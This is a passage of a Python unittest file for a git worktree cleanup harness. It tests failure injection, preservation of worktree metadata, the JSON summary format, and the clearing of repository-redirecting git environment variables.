                "tracked_mode_probe_failed",
                lambda command, cwd: command[1:4]
                == ["-c", "core.fileMode=true", "diff-files"]
                and harness.same_worktree_path(cwd, worktree),
            ),
            (
                "worktree_local_ref_probe_failed",
                lambda command, cwd: command[1:2] == ["for-each-ref"]
                and "refs/bisect/" in command
                and harness.same_worktree_path(cwd, worktree),
            ),
            (
                "worktree_recovery_reachability_probe_failed",
                lambda command, cwd: command[1:3] == ["rev-list", "--no-walk"]
                and harness.same_worktree_path(cwd, self.repo),
            ),
            (
                "reachability_probe_failed",
                lambda command, _cwd: any(
                    part.startswith("--contains=") for part in command
                ),
            ),
        )

        for reason, predicate in cases:
            with self.subTest(reason=reason):
                failing_runner, injected = runner_failing(predicate)
                plan = harness.worktree_plan(
                    self.repo,
                    refresh=True,
                    command_runner=failing_runner,
                    process_cwd=self.repo,
                )
                self.assertTrue(injected)
                self.assertIn(reason, self.candidate(plan, worktree)["reasons"])
                self.assertFalse(plan["complete"])

        with mock.patch.object(
            harness,
            "worktree_head_reflog_commits",
            return_value=([], "permission denied"),
        ):
            recovery_plan = self.plan()
        self.assertIn(
            "worktree_recovery_probe_failed",
            self.candidate(recovery_plan, worktree)["reasons"],
        )
        self.assertFalse(recovery_plan["complete"])

        list_failure, list_injected = runner_failing(
            lambda command, _cwd: command[1:3] == ["worktree", "list"]
        )
        with self.assertRaisesRegex(harness.HarnessError, "worktree list failed"):
            harness.worktree_plan(
                self.repo,
                refresh=False,
                command_runner=list_failure,
                process_cwd=self.repo,
            )
        self.assertTrue(list_injected)

    def test_removing_one_candidate_preserves_unavailable_worktree_metadata(
        self,
    ) -> None:
        removable = self.add_worktree("remove-one")
        unavailable = self.add_worktree("temporarily-unavailable")
        unavailable_git_dir = Path(
            self.git("rev-parse", "--absolute-git-dir", cwd=unavailable).stdout.strip()
        )
        shutil.rmtree(unavailable)

        plan = self.plan()
        self.assertIn("path_unavailable", self.candidate(plan, unavailable)["reasons"])
        self.assertFalse(plan["complete"])
        self.assertFalse(harness.apply_worktree_plan(plan))
        self.assertEqual(plan["apply_error"], "audit_incomplete")
        self.assertTrue(removable.exists())
        self.assertTrue(unavailable_git_dir.is_dir())

    def test_json_summary_is_machine_readable(self) -> None:
        self.add_worktree("json")
        output = io.StringIO()
        with redirect_stdout(output):
            code = harness.worktrees_command(
                SimpleNamespace(
                    repo=str(self.repo), refresh=False, apply=False, json=True
                )
            )
        payload = json.loads(output.getvalue())
        self.assertEqual(code, 0)
        self.assertEqual(payload["schema_version"], 3)
        self.assertEqual(
            payload["fingerprint_lease_seconds"],
            harness.WORKTREE_FINGERPRINT_LEASE_SECONDS,
        )
        self.assertIn("worktrees", payload)
        candidate = self.candidate(payload, self.repo / ".worktrees" / "json")
        for field in (
            "tracked_mode_changes",
            "index_resolve_undo",
            "commit_editmsg_status",
            "worktree_local_refs",
            "worktree_administrative_state",
            "recovery_commits",
            "unretained_recovery_commits",
        ):
            self.assertIn(field, candidate)
        self.assertEqual(payload["summary"]["removed"], 0)
        self.assertEqual(payload["branch_deletion"], "not_performed")
        self.assertFalse(
            payload["cooperative_lease"]["noncooperating_processes_detected"]
        )
        self.assertNotIn("_fingerprint_created_monotonic", payload)

    def test_git_runner_clears_repository_redirecting_environment(self) -> None:
        completed = subprocess.CompletedProcess(["git", "status"], 0, "", "")
        poisoned = {name: "poison" for name in harness.WORKTREE_GIT_CONTEXT_ENV}
        poisoned.update(
            {
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": "remote.origin.url",
                "GIT_CONFIG_VALUE_0": "poison",
                "GIT_CONFIG_PARAMETERS": "'remote.poison.url=https://example.invalid'",
            }
        )
        with mock.patch.dict(os.environ, poisoned, clear=False):
            with mock.patch.object(
                harness, "probe_spawn_argv", return_value=(["git", "status"], "")
            ):
                with mock.patch.object(
                    harness.subprocess, "run", return_value=completed
                ) as spawn:
                    result = harness.worktree_git_runner(
                        ["git", "status"], self.repo, stdin_text="object-id\n"
                    )
        self.assertEqual(result.returncode, 0)
        self.assertEqual(spawn.call_args.kwargs["input"], "object-id\n")
        environment = spawn.call_args.kwargs["env"]
        for name in harness.WORKTREE_GIT_CONTEXT_ENV:
            self.assertNotIn(name, environment)
        self.assertNotIn("GIT_CONFIG_COUNT", environment)
        self.assertNotIn("GIT_CONFIG_KEY_0", environment)
        self.assertNotIn("GIT_CONFIG_VALUE_0", environment)
        self.assertNotIn("GIT_CONFIG_PARAMETERS", environment)
        self.assertEqual(environment["GIT_NO_REPLACE_OBJECTS"], "1")
        self.assertEqual(environment["GIT_OPTIONAL_LOCKS"], "0")


if __name__ == "__main__":
    unittest.main()
